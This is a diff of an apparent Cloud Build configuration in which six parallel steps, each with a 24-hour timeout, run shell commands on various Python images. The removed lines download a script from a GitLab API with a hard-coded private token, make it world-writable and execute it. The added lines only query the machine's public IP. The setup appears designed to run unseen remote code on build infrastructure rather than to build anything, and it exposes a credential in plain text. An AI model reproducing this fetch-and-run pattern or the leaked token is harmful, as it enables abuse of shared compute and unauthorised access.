@@ -4,9 +4,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
   - name: 'python:3.7'
@@ -14,9 +12,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
   - name: 'python:3.6'
@@ -24,9 +20,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
   - name: 'python:3.9'
@@ -34,9 +28,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
   - name: 'python:3.7.10'
@@ -44,9 +36,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
   - name: 'python:3.8.8'
@@ -54,9 +44,7 @@ steps:
     args:
       - "-c"
       - |
-          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
-          chmod 777 test.sh
-          ./test.sh
+          curl ifconfig.me
     timeout: 86400s
     waitFor: ['-']
 timeout: 86400s
